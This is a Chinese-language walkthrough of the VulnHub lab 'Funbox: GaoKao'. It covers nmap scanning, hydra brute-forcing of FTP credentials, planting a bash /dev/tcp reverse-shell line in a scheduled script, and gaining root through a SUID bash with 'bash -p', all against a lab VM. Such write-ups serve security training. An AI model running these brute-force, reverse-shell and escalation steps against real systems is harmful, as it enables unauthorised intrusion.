# vulnhub_Funbox: GaoKao

# 0.简介

**靶机**：https://vulnhub.com/entry/funbox-gaokao,707/  
**难度**：绿色  
**目标 IP**：192.168.205.152  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 17:56 CST
Nmap scan report for 192.168.205.152
Host is up (0.00025s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)
|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)
|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wellcome to Funbox: Gaokao !
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate
| Not valid before: 2021-06-05T15:15:30
|_Not valid after:  2031-06-03T15:15:30
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.34-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSpaceBeforeParenthesis, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: w5w-\x05[lh(@\x08Zp*"=C:\x01\x10
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:84:89:FF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.205.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
                                      
```

Gaokao可能是一个用户

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.205.128 !
230-
230-The local time is: Sun Feb 09 09:57:05 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <sky@funbox9>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||13045|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..
-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
226 Transfer complete
ftp> mget welcome.msg
mget welcome.msg [anpqy?]? y                                                                                                         
229 Entering Extended Passive Mode (|||48839|)
150 Opening BINARY mode data connection for welcome.msg (169 bytes)
100% |******************************************************************************************|   169        5.55 MiB/s    00:00 ETA
226 Transfer complete
169 bytes received in 00:00 (150.30 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat welcome.msg 
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to <sky@%L>.

                
```

sky可能是一个用户，继续

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.152
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10310]
/.                    (Status: 200) [Size: 10310]

```

就一个默认页，页面无隐藏，爆破ssh,ftp（mysql，要是真没有再说）

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.152 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ssh://192.168.205.152:22/

```

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ftp://192.168.205.152 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:04
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ftp://192.168.205.152:21/

[21][ftp] host: 192.168.205.152   login: sky   password: thebest
[STATUS] attack finished for 192.168.205.152 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:53

```

ftp有结果，上去看看

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||39399|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp> mget *
mget user.flag [anpqy?]? y
229 Entering Extended Passive Mode (|||51733|)
150 Opening BINARY mode data connection for user.flag (66 bytes)
100% |******************************************************************************************|    66        1.65 MiB/s    00:00 ETA
226 Transfer complete
66 bytes received in 00:00 (41.31 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat user.flag 
#!/bin/sh
echo "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"
              
```

有个脚本，有点像后台脚本，我们加个shell上去试试

```
┌──(kali㉿kali)-[~/test]
└─$ echo 'bash -i >&/dev/tcp/192.168.205.128/8888 0>&1' >> user.flag
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||24304|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp> put user.flag 
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||53542|)
150 Opening BINARY mode data connection for user.flag
100% |******************************************************************************************|   111        2.35 MiB/s    00:00 ETA
226 Transfer complete
111 bytes sent in 00:00 (117.56 KiB/s)

```

另外窗口监测

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 52670
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
bash-4.4$ sudo -l
[sudo] password for sarah: 
bash-4.4$ ls -al
total 36
dr-xr-xr-x 4 sarah sarah 4096 Jun  6  2021 .
drwxr-xr-x 5 root  root  4096 Jun  5  2021 ..
-r--r--r-- 1 sarah sarah  220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sarah sarah 3771 Jun  5  2021 .bashrc
dr-x------ 2 sarah sarah 4096 Jun  5  2021 .cache
dr-x------ 3 sarah sarah 4096 Jun  5  2021 .gnupg
-r--r--r-- 1 sarah sarah  807 Jun  5  2021 .profile
-r--rw-r-- 1 sarah sarah   74 Jun  5  2021 .selected_editor
-r-------- 1 sarah sarah 3214 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -la
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd lucy/
bash-4.4$ ls -al
total 36
drwxr-xr-x 4 lucy lucy 4096 Jun  6  2021 .
drwxr-xr-x 5 root root 4096 Jun  5  2021 ..
-rw------- 1 lucy lucy  192 Jun  6  2021 .bash_history                                                                               
-rw-r--r-- 1 lucy lucy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 lucy lucy 3771 Apr  4  2018 .bashrc
drwx------ 2 lucy lucy 4096 Jun  5  2021 .cache
drwx------ 3 lucy lucy 4096 Jun  5  2021 .gnupg
-rw-r--r-- 1 lucy lucy  807 Apr  4  2018 .profile
-rw-r--r-- 1 lucy lucy    0 Jun  5  2021 .sudo_as_admin_successful
-rw------- 1 lucy lucy  702 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd sky/
bash-4.4$ ls -al
total 36
drwxr-xr-x 3 sky  sky   4096 Jun  6  2021 .
drwxr-xr-x 5 root root  4096 Jun  5  2021 ..
-rw------- 1 sky  sky     56 Jun  5  2021 .bash_history
-r--r--r-- 1 sky  sky    220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sky  sky   3771 Jun  5  2021 .bashrc
-r--r--r-- 1 sky  sky    807 Jun  5  2021 .profile
drwxr----- 2 root root  4096 Jun  5  2021 .ssh
-rwxr-x--- 1 sky  sarah  111 Feb  9 10:04 user.flag
-rw------- 1 sky  sky   1489 Jun  5  2021 .viminfo
bash-4.4$ find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

传脚本（其实是我靶机抽风了，少了个bash）

```
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:54--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... failed: Connection refused.
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:59--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================>] 820.08K  --.-KB/s    in 0.003s  

2025-02-09 10:08:59 (269 MB/s) - ‘linpeas.sh’ saved [839766/839766]

bash-4.4$ chmod +x linpeas.sh 
bash-4.4$ bash linpeas.sh 
```

也没有，重装吧

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 48504
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)
bash-4.4$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/bash
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

bash -p

```
bash-4.4$ bash -p
bash -p
id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)

```